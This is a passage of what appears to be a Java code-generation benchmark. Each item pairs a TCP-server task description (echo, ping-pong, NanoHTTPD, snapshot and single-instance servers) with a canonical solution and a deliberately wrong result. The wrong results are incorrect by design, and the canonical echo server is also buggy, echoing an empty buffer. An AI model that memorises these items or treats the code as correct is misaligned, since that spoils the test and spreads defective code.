    "wrong_result": "public class ConnectionManipulationProxyServer {\n    private String host;\n    private int remotePort;\n    private int localPort;\n    private Thread proxyThread;\n    private Object enableLock = new Object();\n    private boolean enableProxy = false;\n    private boolean running = false;\n    private Socket client;\n    private Socket server;\n    private ServerSocket serverSocket;\n\n    public ConnectionManipulationProxyServer(String host, int remotePort, int localPort) {\n        this.host = host;\n        this.remotePort = remotePort;\n        this.localPort = localPort;\n        this.proxyThread = new Thread(this::run);\n    }\n\n    public void startProxy() {\n        synchronized (enableLock) {\n            if (enableProxy) {\n                return;\n            }\n            enableProxy = true;\n            running = true;\n            proxyThread.start();\n        }\n    }\n\n    public void stopProxy() {\n        synchronized (enableLock) {\n            if (!enableProxy) {\n                return;\n            }\n            enableProxy = false;\n            running = false;\n            proxyThread.interrupt();\n        }\n    }\n\n    public void killOpenSockets() {\n        synchronized (enableLock) {\n            if (serverSocket != null) {\n                try {\n                    serverSocket.close();\n                } catch (IOException e) {\n                    // Handle exception\n                }\n                serverSocket = null;\n            }\n            if (client != null) {\n                try {\n                    client.close();\n                } catch (IOException e) {\n                    // Handle exception\n                }\n                client = null;\n            }\n            if (server != null) {\n                try {\n                    server.close();\n                } catch (IOException e) {\n                    // Handle exception\n                }\n                server = null;\n            }\n            running = false;\n            enableProxy = false;\n            proxyThread.interrupt();\n        }\n    }\n\n    public void run() {\n        try {\n            serverSocket = new ServerSocket(localPort);\n            while (running) {\n                Socket client = serverSocket.accept();\n                Socket server = new Socket(host, remotePort);\n                this.client = client;\n                this.server = server;\n                new Thread(() -> {\n                    try {\n                        byte[] buffer = new byte[1024];\n                        int bytesRead;\n                        while ((bytesRead = client.getInputStream().read(buffer)) > 0) {\n                            server.getOutputStream().write(buffer, 0, bytesRead);\n                            server.getOutputStream().flush();\n                        }\n                        while ((bytesRead = server.getInputStream().read(buffer)) > 0) {\n                            client.getOutputStream().write(buffer, 0, bytesRead);\n                            client.getOutputStream().flush();\n                        }\n                    } catch (IOException e) {\n                        // Handle exception\n                    } finally {\n                        try {\n                            client.close();\n                            server.close();\n                        } catch (IOException e) {\n                            // Handle exception\n                        }\n                    }\n                }).start();\n            }\n        } catch (IOException e) {\n            // Handle exception\n        } finally {\n            try {\n                if (serverSocket != null) {\n                    serverSocket.close();\n                }\n            } catch (IOException e) {\n                // Handle exception\n            }\n        }\n    }\n\n    public int getLocalPort() {\n        return localPort;\n    }\n}"
  },
  {
    "Task_id": 541,
    "Instruction": "Task Description: Implement a TCP server in Java that handles multiple client connections concurrently using blocking I/O. The server should echo back any data received from clients after sending an initial welcome message.\n\nClass Description: EchoBioServer is a TCP server implementation that listens for incoming client connections on a specified port. For each connection, it creates a new thread to handle communication, sending a welcome message initially and then echoing back all received data.\n\nAttributes:\n- FIRST_BYTES: byte[] - The welcome message to be sent to clients upon connection\n- serverSocket: ServerSocket - The server socket listening for incoming connections\n\nMethods:\n- EchoBioServer(int port) -> void - Constructor that initializes the server socket on the specified port\n- run() -> void - Main server loop that accepts incoming connections and spawns new threads for each client\n- BioConnection(Socket socket) -> void - Nested class constructor that handles individual client connections\n- run() -> void - (In BioConnection) Handles the communication with a single client, echoing received data\n\nNested Class: BioConnection\nAttributes:\n- socket: Socket - The client socket connection\n- input: InputStream - Input stream for reading client data\n- output: OutputStream - Output stream for writing to client\n- readBuffer: byte[] - Buffer for storing received data\n- writeBuffer: byte[] - Buffer for storing data to send\n\nMethods:\n- BioConnection(Socket socket) -> void - Constructor that initializes I/O streams and buffers for a client connection\n- run() -> void - Handles the client communication loop (send welcome message, echo received data)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class EchoBioServer implements Runnable {\n\n    private static final byte[] FIRST_BYTES = \"Welcome to Cobar Server.\".getBytes();\n    private final ServerSocket serverSocket;\n\n    public EchoBioServer(int port) throws IOException {\n        serverSocket = new ServerSocket(port);\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            try {\n                Socket socket = serverSocket.accept();\n                new Thread(new BioConnection(socket)).start();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private class BioConnection implements Runnable {\n        private Socket socket;\n        private InputStream input;\n        private OutputStream output;\n        private byte[] readBuffer;\n        private byte[] writeBuffer;\n\n        private BioConnection(Socket socket) throws IOException {\n            this.socket = socket;\n            this.input = socket.getInputStream();\n            this.output = socket.getOutputStream();\n            this.readBuffer = new byte[4096];\n            this.writeBuffer = new byte[4096];\n        }\n\n        @Override\n        public void run() {\n            try {\n                output.write(FIRST_BYTES);\n                output.flush();\n                while (true) {\n                    int got = input.read(readBuffer);\n                    output.write(writeBuffer, 0, got);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n                if (socket != null) {\n                    try {\n                        socket.close();\n                    } catch (IOException e1) {\n                        e1.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class EchoBioServer {\n    public static final byte[] FIRST_BYTES = \"Welcome to EchoBioServer\\r\\n\".getBytes();\n    private ServerSocket serverSocket;\n\n    public EchoBioServer(int port) {\n        try {\n            serverSocket = new ServerSocket(port);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void run() {\n        while (true) {\n            try {\n                Socket socket = serverSocket.accept();\n                BioConnection connection = new BioConnection(socket);\n                connection.start();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private class BioConnection implements Runnable {\n        private Socket socket;\n        private InputStream input;\n        private OutputStream output;\n        private byte[] readBuffer = new byte[1024];\n        private byte[] writeBuffer = new byte[1024];\n\n        public BioConnection(Socket socket) {\n            this.socket = socket;\n            try {\n                input = socket.getInputStream();\n                output = socket.getOutputStream();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        @Override\n        public void run() {\n            try {\n                output.write(FIRST_BYTES);\n                output.flush();\n\n                int bytesRead;\n                while ((bytesRead = input.read(readBuffer)) != -1) {\n                    output.write(readBuffer, 0, bytesRead);\n                    output.flush();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 542,
    "Instruction": "Task Description: Implement a TCP server class in Java that handles incoming client connections, processes commands, and interacts with a GUI frame. The server should support checking for existing instances, activating windows, and processing file operations.\n\nClass Description: TcpServer is a Thread subclass that creates a TCP server listening on a specified port. It communicates with clients to perform actions like getting window titles, activating windows, and opening files in the associated GUI frame.\n\nAttributes:\n- frame: IAppFrame - Reference to the application's GUI frame for window operations\n- port: int - The port number on which the server listens\n- file: String - File path to be processed (optional)\n\nMethods:\n- TcpServer(int port, IAppFrame frame) -> None - Constructor initializing server with port and frame reference\n- TcpServer(int port, IAppFrame frame, String file) -> None - Constructor with additional file parameter\n- checkExistInstance(int port) -> boolean - Static method checking if another instance is running on given port\n- ask(String host, String cmd, int port) -> boolean - Private static helper method for sending commands to existing instances\n- run() -> None - Main server thread method that listens for connections and processes client requests",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport javax.swing.JFrame;\nimport javax.swing.SwingUtilities;\n\npublic class TcpServer extends Thread {\n    private IAppFrame frame;\n    private int port;\n    private String file;\n\n    public static String GETWINDOWTITLE = \"GetWindowTitle\";\n    public static String ACTIVATE = \"ACTIVATE\";\n    public static String LOCALHOST = \"127.0.0.1\";\n\n    public TcpServer(int port, IAppFrame frame, String file) {\n        this(port, frame);\n        this.file = file;\n    }\n\n    public TcpServer(int port, IAppFrame frame) {\n        this.port = port;\n        this.frame = frame;\n    }\n\n    public static boolean checkExistInstance(int port) {\n        return ask(LOCALHOST, GETWINDOWTITLE, port);\n    }\n\n    private static boolean ask(String host, String cmd, int port) {\n        Socket s = new Socket();\n        try {\n            InetSocketAddress isa = new InetSocketAddress(host, port);\n            s.connect(isa, 2000);\n            OutputStream os = s.getOutputStream();\n            os.write(cmd.getBytes());\n            InputStream is = s.getInputStream();\n            byte[] buffer = new byte[1024];\n            int len = is.read(buffer);\n            String res = new String(buffer, 0, len);\n            return res != null && !res.isEmpty();\n        } catch (Exception x) {\n            return false;\n        } finally {\n            try {\n                s.close();\n            } catch (IOException e) {\n            }\n        }\n    }\n\n    public void run() {\n        ServerSocket ss = null;\n        try {\n            ss = new ServerSocket(port, 10, InetAddress.getByName(LOCALHOST));\n            while (true) {\n                Socket s = ss.accept();\n                try {\n                    InputStream is = s.getInputStream();\n                    byte[] buffer = new byte[1024];\n                    int len = is.read(buffer);\n                    String file = new String(buffer, 0, len);\n                    \n                    if (file.equals(GETWINDOWTITLE)) {\n                        OutputStream os = s.getOutputStream();\n                        String wTitle = ((JFrame) frame).getTitle();\n                        os.write(wTitle.getBytes());\n                    } else if (file.equals(ACTIVATE)) {\n                        ((JFrame) frame).toFront();\n                    } else {\n                        if (file.startsWith(\"\\\"\")) {\n                            file = file.substring(1, file.length() - 1);\n                        }\n                        final String sfile = file;\n                        SwingUtilities.invokeLater(() -> {\n                            try {\n                                frame.openSheetFile(sfile);\n                            } catch (Exception e) {\n                                e.printStackTrace();\n                            }\n                        });\n                    }\n                } finally {\n                    s.close();\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            if (ss != null) {\n                try {\n                    ss.close();\n                } catch (IOException e) {\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "import java.io.*;\nimport java.net.*;\nimport java.util.*;\n\npublic class TcpServer extends Thread {\n    private final int port;\n    private final IAppFrame frame;\n    private final String file;\n\n    public TcpServer(int port, IAppFrame frame) {\n        this.port = port;\n        this.frame = frame;\n        this.file = null;\n    }\n\n    public TcpServer(int port, IAppFrame frame, String file) {\n        this.port = port;\n        this.frame = frame;\n        this.file = file;\n    }\n\n    public static boolean checkExistInstance(int port) {\n        try (ServerSocket socket = new ServerSocket(port)) {\n            socket.close();\n            return false;\n        } catch (IOException e) {\n            return true;\n        }\n    }\n\n    private static boolean ask(String host, String cmd, int port) {\n        try (Socket socket = new Socket(host, port)) {\n            ObjectOutputStream out = new ObjectOutputStream(socket.getOutputStream());\n            ObjectInputStream in = new ObjectInputStream(socket.getInputStream());\n            out.writeObject(cmd);\n            return (boolean) in.readObject();\n        } catch (Exception e) {\n            return false;\n        }\n    }\n\n    @Override\n    public void run() {\n        try (ServerSocket serverSocket = new ServerSocket(port)) {\n            serverSocket.setReuseAddress(true);\n            if (file != null) {\n                frame.openFile(file);\n            }\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                new Thread(() -> {\n                    try (InputStream in = clientSocket.getInputStream();\n                         OutputStream out = clientSocket.getOutputStream()) {\n                        BufferedReader reader = new BufferedReader(new InputStreamReader(in));\n                        String command = reader.readLine();\n                        boolean result = processCommand(command);\n                        PrintWriter writer = new PrintWriter(out, true);\n                        writer.println(result);\n                    } catch (Exception e) {\n                        e.printStackTrace();\n                    }\n                }).start();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private boolean processCommand(String command) {\n        if (command.equals(\"getWindowTitle\")) {\n            return frame.getTitle() != null;\n        } else if (command.equals(\"activateWindow\")) {\n            frame.activate();\n            return true;\n        } else if (command.equals(\"openFile\")) {\n            if (file != null) {\n                frame.openFile(file);\n                return true;\n            }\n            return false;\n        }\n        return false;\n    }\n}"
  },
  {
    "Task_id": 543,
    "Instruction": "Task Description: Implement a TCP server that listens for incoming connections and responds with a \"PONG\" message when a client connects. The server should run in a separate thread and be able to be gracefully shut down.\n\nClass Description: PingPongSocketServer is a TCP server implementation that listens on a specified port for client connections. Upon accepting a connection, it immediately sends a \"PONG\" response and closes the connection. The server runs in a dedicated thread and supports graceful termination.\n\nAttributes:\n- thread: Thread - The thread in which the server runs\n- serverSocket: ServerSocket - The socket that listens for incoming connections\n- terminated: boolean - Flag indicating whether the server should stop running\n\nMethods:\n- initialize(int port) -> void - Initializes the server by creating a ServerSocket on the specified port and starting the server thread\n- close() -> void - Gracefully shuts down the server by closing the ServerSocket and interrupting the server thread",
    "Canonical_solution": "import tech.powerjob.common.utils.CommonUtils;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.nio.charset.StandardCharsets;\n\npublic class PingPongSocketServer implements PingPongServer {\n\n    private Thread thread;\n    private ServerSocket serverSocket;\n    private volatile boolean terminated = false;\n\n    @Override\n    public void initialize(int port) throws Exception {\n        serverSocket = new ServerSocket(port);\n\n        thread = new Thread(() -> {\n            while (true) {\n                if (terminated) {\n                    return;\n                }\n                try (Socket socket = serverSocket.accept();\n                     OutputStream outputStream = socket.getOutputStream()) {\n\n                    socket.setSoTimeout(2000);\n                    socket.setKeepAlive(false);\n\n                    outputStream.write(PingPongUtils.PONG.getBytes(StandardCharsets.UTF_8));\n                    outputStream.write(System.lineSeparator().getBytes(StandardCharsets.UTF_8));\n                    outputStream.flush();\n                } catch (Exception e) {\n                    if (!terminated) {\n                        log.warn(\"[PingPongSocketServer] process accepted socket failed!\", e);\n                    }\n                }\n            }\n        }, \"PingPongSocketServer-Thread\");\n\n        thread.start();\n    }\n\n    @Override\n    public void close() throws IOException {\n        terminated = true;\n        CommonUtils.executeIgnoreException(() -> serverSocket.close());\n        thread.interrupt();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class PingPongSocketServer {\n    private Thread thread;\n    private ServerSocket serverSocket;\n    private boolean terminated;\n\n    public void initialize(int port) {\n        try {\n            serverSocket = new ServerSocket(port);\n            thread = new Thread(this::run);\n            thread.start();\n        } catch (IOException e) {\n            // Handle or log exception\n        }\n    }\n\n    public void close() {\n        terminated = true;\n        try {\n            if (serverSocket != null) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            // Handle or log exception\n        }\n    }\n\n    private void run() {\n        while (!terminated) {\n            try {\n                Socket clientSocket = serverSocket.accept();\n                PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n                out.println(\"PONG\");\n                clientSocket.close();\n            } catch (IOException e) {\n                if (terminated) {\n                    break;\n                }\n                // Handle other exceptions if needed\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 544,
    "Instruction": "Task Description: Create a lightweight HTTP server class that can handle incoming client connections and process requests through abstract methods that must be implemented by subclasses.\n\nClass Description: NanoHTTPD is a minimal HTTP server implementation that listens for incoming TCP connections on a specified port, handles client connections by providing input/output streams, and requires subclasses to implement the actual request processing logic.\n\nAttributes:\n- hostname: String - The hostname or IP address to bind the server to (nullable)\n- myPort: int - The port number to listen on\n- myServerSocket: ServerSocket - The server socket instance for accepting connections\n- myThread: Thread - The main listener thread for the server\n\nMethods:\n- NanoHTTPD(int port) -> void - Constructor that initializes the server with just a port number (hostname defaults to null)\n- NanoHTTPD(String hostname, int port) -> void - Constructor that initializes the server with both hostname and port\n- start() -> void - Starts the server by creating a ServerSocket and launching a daemon thread to accept connections\n- stop() -> void - Stops the server by closing the ServerSocket and joining the listener thread\n- handleConnection(InputStream inputStream, OutputStream outputStream) -> abstract void - Abstract method that must be implemented by subclasses to handle the actual client connection processing",
    "Canonical_solution": "import android.util.Log;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic abstract class NanoHTTPD {\n    private final String hostname;\n    private final int myPort;\n    private ServerSocket myServerSocket;\n    private Thread myThread;\n\n    public NanoHTTPD(int port) {\n        this(null, port);\n    }\n\n    public NanoHTTPD(String hostname, int port) {\n        this.hostname = hostname;\n        this.myPort = port;\n    }\n\n    public void start() throws IOException {\n        Log.i(\"NanoHTTPD\", \"server start\");\n        myServerSocket = new ServerSocket();\n        myServerSocket.bind((hostname != null) ? new InetSocketAddress(\n                hostname, myPort) : new InetSocketAddress(myPort));\n\n        myThread = new Thread(new Runnable() {\n            @Override\n            public void run() {\n                do {\n                    try {\n                        final Socket finalAccept = myServerSocket.accept();\n                        Log.i(\"NanoHTTPD\",\n                                \"accept request from \"\n                                        + finalAccept.getInetAddress());\n                        InputStream inputStream = finalAccept.getInputStream();\n                        OutputStream outputStream = finalAccept\n                                .getOutputStream();\n                        handleConnection(inputStream, outputStream);\n                        if (finalAccept != null) {\n                            finalAccept.close();\n                        }\n                    } catch (IOException e) {\n                    }\n                } while (!myServerSocket.isClosed());\n            }\n        });\n        myThread.setDaemon(true);\n        myThread.setName(\"NanoHttpd Main Listener\");\n        myThread.start();\n    }\n\n    public void stop() {\n        Log.i(\"NanoHTTPD\", \"server stop\");\n        try {\n            myServerSocket.close();\n            myThread.join();\n        } catch (IOException ioe) {\n            ioe.printStackTrace();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    protected abstract void handleConnection(InputStream inputStream, OutputStream outputStream);\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public abstract class NanoHTTPD {\n    private String hostname;\n    private int myPort;\n    private ServerSocket myServerSocket;\n    private Thread myThread;\n\n    public NanoHTTPD(int port) {\n        this.hostname = null;\n        this.myPort = port;\n    }\n\n    public NanoHTTPD(String hostname, int port) {\n        this.hostname = hostname;\n        this.myPort = port;\n    }\n\n    public void start() {\n        try {\n            if (hostname != null) {\n                myServerSocket = new ServerSocket(myPort, 0, InetAddress.getByName(hostname));\n            } else {\n                myServerSocket = new ServerSocket(myPort, 0);\n            }\n            myThread = new Thread(() -> {\n                while (true) {\n                    try {\n                        Socket socket = myServerSocket.accept();\n                        InputStream inputStream = socket.getInputStream();\n                        OutputStream outputStream = socket.getOutputStream();\n                        handleConnection(inputStream, outputStream);\n                    } catch (IOException e) {\n                        break;\n                    }\n                }\n            });\n            myThread.setDaemon(true);\n            myThread.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        if (myServerSocket != null) {\n            try {\n                myServerSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (myThread != null) {\n            try {\n                myThread.join();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public abstract void handleConnection(InputStream inputStream, OutputStream outputStream);\n}"
  },
  {
    "Task_id": 545,
    "Instruction": "Task Description: Implement a TCP server thread class that handles incoming client connections, processes commands, and manages application state through network communication.\n\nClass Description: InnerSocketThread is a Thread subclass that creates a TCP server to listen for client connections on a specified port. It processes incoming commands to control application state and respond with status information.\n\nAttributes:\n- socket: ServerSocket - The server socket instance used to listen for incoming client connections\n\nMethods:\n- run() -> void - Main thread execution method that sets up the server socket, accepts connections, processes commands, and manages resources\n- read(InputStream in) -> String - Reads data from the input stream until carriage return is encountered\n- write(OutputStream os) -> void - Writes the current application status to the output stream\n\nMethod Details:\n1. run():\n   - Input: None (uses class attributes)\n   - Output: None\n   - Description: \n     1. Creates ServerSocket on Manager.PORT\n     2. Enters infinite loop to accept client connections\n     3. Sets socket timeout to 5000ms\n     4. Reads command from client\n     5. Processes commands (START, STATUS, FLUSHMETHOD)\n     6. Sends response for STATUS command\n     7. Closes client connection\n     8. Handles exceptions and ensures proper resource cleanup\n\n2. read(InputStream in):\n   - Input: \n     - in: InputStream - The input stream from client socket\n   - Output: String - The command string read from the stream\n   - Description:\n     1. Reads bytes from buffered input stream\n     2. Converts bytes to characters\n     3. Stops reading at carriage return ('\\r')\n     4. Returns accumulated string\n\n3. write(OutputStream os):\n   - Input:\n     - os: OutputStream - The output stream to client socket\n   - Output: None\n   - Description:\n     1. Writes \"running\" or \"stop\" based on Manager's switch flag\n     2. Appends carriage return\n     3. Flushes the output stream",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\n\npublic class InnerSocketThread extends Thread {\n    private ServerSocket socket;\n\n    public void run() {\n        try {\n            socket = new ServerSocket(Manager.PORT);\n            while (true) {\n                Socket child = socket.accept();\n                child.setSoTimeout(5000);\n\n                String command = read(child.getInputStream());\n\n                if (Manager.START.equals(command)) {\n                    Manager.instance().setSwitchFlag(true);\n                } else if (Manager.STATUS.equals(command)) {\n                    write(child.getOutputStream());\n                } else if (Manager.FLUSHMETHOD.equals(command)) {\n                    MethodCache.flushMethodData();\n                } else {\n                    Manager.instance().setSwitchFlag(false);\n                }\n                child.close();\n            }\n        } catch (SocketException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (socket != null) {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private String read(InputStream in) throws IOException {\n        BufferedInputStream bin = new BufferedInputStream(in);\n        StringBuffer sb = new StringBuffer();\n        int i;\n        while ((i = bin.read()) != -1) {\n            char c = (char) i;\n            if (c == '\\r') {\n                break;\n            } else {\n                sb.append(c);\n            }\n        }\n        return sb.toString();\n    }\n\n    private void write(OutputStream os) throws IOException {\n        BufferedOutputStream out = new BufferedOutputStream(os);\n        if (Manager.instance().getSwitchFlag()) {\n            out.write(\"running\".getBytes());\n        } else {\n            out.write(\"stop\".getBytes());\n        }\n        out.write('\\r');\n        out.flush();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class InnerSocketThread extends Thread {\n    private ServerSocket socket;\n\n    public void run() {\n        try {\n            socket = new ServerSocket(Manager.PORT);\n            socket.setSoTimeout(5000);\n            while (true) {\n                try {\n                    Socket clientSocket = socket.accept();\n                    try (InputStream in = clientSocket.getInputStream(); OutputStream os = clientSocket.getOutputStream()) {\n                        String command = read(in);\n                        if (\"STATUS\".equals(command)) {\n                            write(os);\n                        }\n                        clientSocket.close();\n                    }\n                } catch (SocketTimeoutException e) {\n                    continue;\n                } catch (IOException e) {\n                    break;\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                if (socket != null) socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private String read(InputStream in) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        int ch;\n        while ((ch = in.read()) != -1) {\n            if (ch == '\\r') break;\n            sb.append((char) ch);\n        }\n        return sb.toString();\n    }\n\n    private void write(OutputStream os) throws IOException {\n        String status = Manager.isSwitchOn() ? \"running\" : \"stop\";\n        os.write((status + \"\\r\").getBytes());\n        os.flush();\n    }\n}"
  },
  {
    "Task_id": 547,
    "Instruction": "Task Description: Implement a TCP server class that listens for incoming client connections, processes client commands, and sends responses back. The server should run in a dedicated thread and support graceful shutdown.\n\nClass Description: SnapshotService is a TCP server implementation that listens on a specified port for client connections. It processes incoming commands from clients and responds with processed messages. The server runs in a separate thread and maintains its state through a boolean flag for controlled shutdown.\n\nAttributes:\n- port: [int] - The port number on which the server listens for incoming connections\n- serverSocket: [ServerSocket] - The server socket instance used to accept client connections\n- closed: [boolean] - Flag indicating whether the server has been shut down\n\nMethods:\n- SnapshotService(int port) -> [void] - Constructor that validates and sets the server port\n- listen() -> [void] - Starts the server by opening a socket and beginning to listen for connections\n- openSocket(int port) -> [int] - Creates a ServerSocket and starts a thread to handle client connections, returns the actual port being used\n- isIgnoredException() -> [boolean] - Checks if an exception should be ignored based on server socket state\n- process(Socket socket) -> [void] - Processes an individual client connection, reading input and sending responses\n- outputMessage(BufferedWriter outputWriter, String msg) -> [void] - Helper method to send messages to clients\n- close() -> [void] - Gracefully shuts down the server by closing the server socket",
    "Canonical_solution": "import com.google.common.base.Preconditions;\nimport lombok.extern.slf4j.Slf4j;\nimport java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\n@Slf4j\npublic final class SnapshotService {\n\n    private final int port;\n    private ServerSocket serverSocket;\n    private volatile boolean closed;\n\n    public SnapshotService(final int port) {\n        Preconditions.checkArgument(port >= 0 && port <= 0xFFFF, \"Port value out of range: \" + port);\n        this.port = port;\n    }\n\n    public void listen() {\n        try {\n            log.info(\"ElasticJob: Snapshot service is running on port '{}'\", openSocket(port));\n        } catch (final IOException ex) {\n            log.error(\"ElasticJob: Snapshot service listen failure, error is: \", ex);\n        }\n    }\n\n    private int openSocket(final int port) throws IOException {\n        closed = false;\n        serverSocket = new ServerSocket(port);\n        int localPort = serverSocket.getLocalPort();\n        String threadName = String.format(\"elasticjob-snapshot-service-%d\", localPort);\n        new Thread(() -> {\n            while (!closed) {\n                try {\n                    process(serverSocket.accept());\n                } catch (final IOException ex) {\n                    if (isIgnoredException()) {\n                        return;\n                    }\n                    log.error(\"ElasticJob: Snapshot service open socket failure, error is: \", ex);\n                }\n            }\n        }, threadName).start();\n        return localPort;\n    }\n\n    private boolean isIgnoredException() {\n        return serverSocket.isClosed();\n    }\n\n    private void process(final Socket socket) throws IOException {\n        try (\n                BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n                Socket ignored = socket) {\n            String cmdLine = reader.readLine();\n            if (null != cmdLine) {\n                outputMessage(writer, \"Processed: \" + cmdLine);\n            }\n        }\n    }\n\n    private void outputMessage(final BufferedWriter outputWriter, final String msg) throws IOException {\n        outputWriter.append(msg);\n        outputWriter.flush();\n    }\n\n    public void close() {\n        closed = true;\n        if (null != serverSocket && !serverSocket.isClosed()) {\n            try {\n                serverSocket.close();\n            } catch (final IOException ex) {\n                log.error(\"ElasticJob: Snapshot service close failure, error is: \", ex);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class SnapshotService {\n    private int port;\n    private ServerSocket serverSocket;\n    private boolean closed = false;\n\n    public SnapshotService(int port) {\n        if (port < 1 || port > 65535) {\n            throw new IllegalArgumentException(\"Port must be between 1 and 65535\");\n        }\n        this.port = port;\n    }\n\n    public void listen() {\n        openSocket(port);\n    }\n\n    public int openSocket(int port) {\n        try {\n            serverSocket = new ServerSocket(port);\n            new Thread(() -> {\n                while (!closed) {\n                    try {\n                        Socket socket = serverSocket.accept();\n                        process(socket);\n                    } catch (IOException e) {\n                        if (!isIgnoredException()) {\n                            e.printStackTrace();\n                        }\n                    }\n                }\n            }).start();\n            return serverSocket.getLocalPort();\n        } catch (IOException e) {\n            if (!isIgnoredException()) {\n                e.printStackTrace();\n            }\n            return -1;\n        }\n    }\n\n    private boolean isIgnoredException() {\n        return closed;\n    }\n\n    private void process(Socket socket) {\n        try {\n            BufferedReader inputReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            BufferedWriter outputWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n            String inputLine;\n            while ((inputLine = inputReader.readLine()) != null) {\n                String response = processCommand(inputLine);\n                outputMessage(outputWriter, response);\n            }\n        } catch (IOException e) {\n            if (!isIgnoredException()) {\n                e.printStackTrace();\n            }\n        } finally {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private String processCommand(String inputLine) {\n        return \"Received: \" + inputLine;\n    }\n\n    private void outputMessage(BufferedWriter outputWriter, String msg) {\n        try {\n            outputWriter.write(msg);\n            outputWriter.newLine();\n            outputWriter.flush();\n        } catch (IOException e) {\n            if (!isIgnoredException()) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void close() {\n        closed = true;\n        try {\n            if (serverSocket != null) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            if (!isIgnoredException()) {\n                e.printStackTrace();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 548,
    "Instruction": "Task Description: Create a Java class that implements a TCP server for binary data communication, capable of handling client connections and data exchange using object serialization.\n\nClass Description: BinaryLinkServer is a TCP server implementation that listens for incoming client connections, establishes communication channels, and handles binary data exchange using Java's object serialization. It manages connection lifecycle and provides thread-safe termination.\n\nAttributes:\n- acceptor: Acceptor - Thread responsible for accepting incoming client connections\n- handler: AtomicReference<Handler> - Thread-safe reference to the current connection handler\n\nMethods:\n- BinaryLinkServer() -> void - Constructor that initializes the server and starts the acceptor thread\n- terminate() -> void - Shuts down the server by closing all active connections and stopping threads\n- getListenAddress() -> InetAddress - Determines the server's listening address from system properties or defaults to loopback\n- getListenPort() -> int - Retrieves the server's listening port from system properties or uses ephemeral port\n\nNested Classes:\n1. Acceptor (extends Thread):\n   Attributes:\n   - server: ServerSocket - The server socket listening for connections\n   - listenAddress: InetAddress - The address the server is bound to\n\n   Methods:\n   - Acceptor() -> void - Constructor that creates the server socket\n   - run() -> void - Main acceptor loop that handles incoming connections\n   - close() -> void - Closes the server socket\n\n2. Handler (extends Thread):\n   Attributes:\n   - socket: Socket - The client connection socket\n   - is: InputStream - Input stream from the client\n   - os: OutputStream - Output stream to the client\n   - ois: ObjectInputStream - Object input stream for deserialization\n   - oos: ObjectOutputStream - Object output stream for serialization\n\n   Methods:\n   - Handler(Socket) -> void - Constructor that initializes communication streams\n   - run() -> void - Main handler loop that processes incoming objects\n   - close() -> void - Closes the client connection and releases resources",
